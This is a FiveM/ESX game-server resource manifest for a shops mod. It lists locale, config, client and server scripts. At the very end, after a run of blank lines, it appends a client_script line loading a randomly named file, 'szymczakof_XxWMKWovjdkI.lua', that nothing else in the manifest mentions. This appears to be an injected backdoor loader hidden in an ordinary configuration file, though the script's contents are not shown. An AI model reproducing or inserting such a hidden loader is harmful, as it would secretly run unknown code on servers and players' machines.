resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
lua54 'yes'
description 'ESX Shops'

version '1.1.0'

client_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/es.lua',
	'locales/sv.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	'@mysql-async/lib/MySQL.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/es.lua',
	'locales/sv.lua',
	'config.lua',
	'server/main.lua'
}

dependency 'es_extended'










client_script "szymczakof_XxWMKWovjdkI.lua"